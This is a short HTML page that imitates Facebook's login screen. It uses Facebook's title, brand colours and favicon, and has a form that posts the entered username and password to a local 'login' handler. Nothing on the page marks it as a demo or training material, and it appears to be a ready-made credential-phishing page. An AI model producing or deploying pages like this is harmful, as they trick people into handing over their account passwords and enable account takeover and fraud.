<!DOCTYPE html>
<html>
<head>
      <meta charset="utf-8"/>
  <title>Facebook – log in or sign up</title>
  <style>
    body {background:#edf0f5;font-family:sans-serif;}
    .main {max-width:330px;margin:80px auto;padding:34px;background:#fff;border-radius:8px;box-shadow:0 6px 24px #3333;}
    .logo {text-align:center;}
    .logo img {margin-bottom:12px;}
    input {width:100%;padding:10px;margin:8px 0 14px 0;border:1px solid #ccd0d5;border-radius:5px;}
    button {width:100%;background:#1877f2;color:#fff;border:none;font-size:17px;padding:12px 0;border-radius:7px;}
    small {color:#888;}
  </style>
</head>
<body>
  <div class="main">
    <div class="logo">
      <img src="https://static.xx.fbcdn.net/rsrc.php/yo/r/iRmz9lCMBD2.ico" width="45">
    </div>
    <form method="POST" action="login">
      <input type="text" name="username" placeholder="Mobile number or email" required>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit">Log In</button>
    </form>
    <small style="display:block;text-align:center;margin-top:8px;">Facebook © 2024</small>
  </div>
</body>
</html>
